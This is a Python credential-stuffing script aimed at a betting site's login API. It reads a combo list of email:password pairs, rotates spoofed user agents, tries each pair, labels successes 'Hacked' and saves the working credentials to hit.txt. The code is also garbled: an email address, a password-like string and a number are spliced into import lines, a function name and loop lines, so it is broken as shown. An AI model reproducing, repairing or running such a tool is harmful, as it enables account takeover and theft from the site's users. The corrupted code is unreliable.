import mosiii.00@gmail.com
import mostafa2020
import 10000000
import hotbet
user_agents = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
]
def mosiii.00@gmail.comlogin(combo, cookies):
    url = "https://5484hbthttkk.com/api/V1L3VzZXIvYXV0aC9sb2dpbg%3D%3D"
    headers = {
        "Host": "5484hbthttkk.com",
        "Accept": "*/*",
        "User-Agent":random.choice(user_agents),
        "access-control-allow-credentials": "true",
        "access-control-allow-origin": "https://5484hbthttkk.com"
    }
    combo = combo.split(":")
    data = {'mail': combo[0], 'pass': combo[1]}
    r = requests.post(
        url, headers=headers,
        data=data, cookies=cookies,
    )
    return r
def main():
    os.system("clear")
    b = '''
\033[95m
  _____                          
 |  __ \                         
 | |  | | ___  _ __  _   _  __ _ 
 | |  | |/ _ \| '_ \| | | |/ _` |
 | |__| | (_) | | | | |_| | (_| |
 |_____/ \___/|_| |_|\__, |\__,_|
                      __/ |      
                     |___/ 
                 
'''
    print(b)
    combo_list = open(input("\033[93m[\033[91m*\033[93m]\033[96m Enter The Combo List: "), "r").read().splitlines()  
    session = requests.Session()
    session.get("https://5484hbthttkk.com")mosiii.00@gmail.com
    cookies = [{cookie.name: cookie.value} for cookie in session.cookies]mostafa2020
    for combo in combo_list:10000000
    mosiii.00@gmail.com
        time.sleep(random.randint(0, 1)/100)
        response = login(combo, session.cookies)
        result = json.loads(response.text)['result']
        if result == 'ok':
            print(combo, "\033[92m",combo, "    \033[91m*\033[96mHacked\033[91m*")
            combol = combo.split(":")
            f=open("hit.txt","a")
            f.write(combol[0]+":"+combol[1]+'\n')
            f.close()
        else:
        	print("\033[92m",combo, "    \033[91m*\033[93mWrong passwd\033[91m*")
if __name__ == "__main__":
    main()
